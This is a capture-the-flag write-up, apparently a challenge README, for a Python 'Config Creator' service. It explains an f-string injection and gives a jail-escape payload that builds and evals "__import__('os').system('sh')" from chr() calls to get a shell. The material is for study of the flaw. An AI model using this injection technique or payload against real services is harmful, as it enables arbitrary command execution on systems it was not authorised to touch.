# pwn | Config Creator

The program lets you create a configuration files through python fstrings. 

It reads the keys and values and create a template which looks like this:

```python
f"""
configuration [
    key1: {key1};
    key2: {key2};
    ...
]
"""
```

Then this template is evaluated to generate the actual configuration file.

The issue is that you control the fstring, so you can set a key with a name of `dir()` for example. So your template would look like this:

```python
f"""
configuration [
    dir(): {dir()};
]
"""
```

And once evaluated it would look like this:

```bash
configuration [
    dir(): ['__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__']
;
]
```

So you just need to find the right string to pop a shell, sadly you quickly realize that a lot of characters are stripped. The only characters allowed are:

```python
string.digits + string.ascii_letters + "(),[]"
``` 

So it's just a jail escape :)

One way to solve this is to launch:

```python
eval("__import__('os').system('sh')")
```

But you need to build the string `"__import__('os').system('sh')"`.
This is done like this **in python3.6.4**:

```python
dir(str())[55] == "join"
getattr(str(), "join") == "".join
"__import__('os').system('sh')" == "".join(chr(91), ..., chr(41))
```

Final exploit:

```python
key = eval(getattr(str(),dir(str())[55])([chr(95),chr(95),chr(105),chr(109),chr(112),chr(111),chr(114),chr(116),chr(95),chr(95),chr(40),chr(39),chr(111),chr(115),chr(39),chr(41),chr(46),chr(115),chr(121),chr(115),chr(116),chr(101),chr(109),chr(40),chr(39),chr(115),chr(104),chr(39),chr(41)]))
value = 123
```

Please see *exploit/exploit* for the full automated exploit.
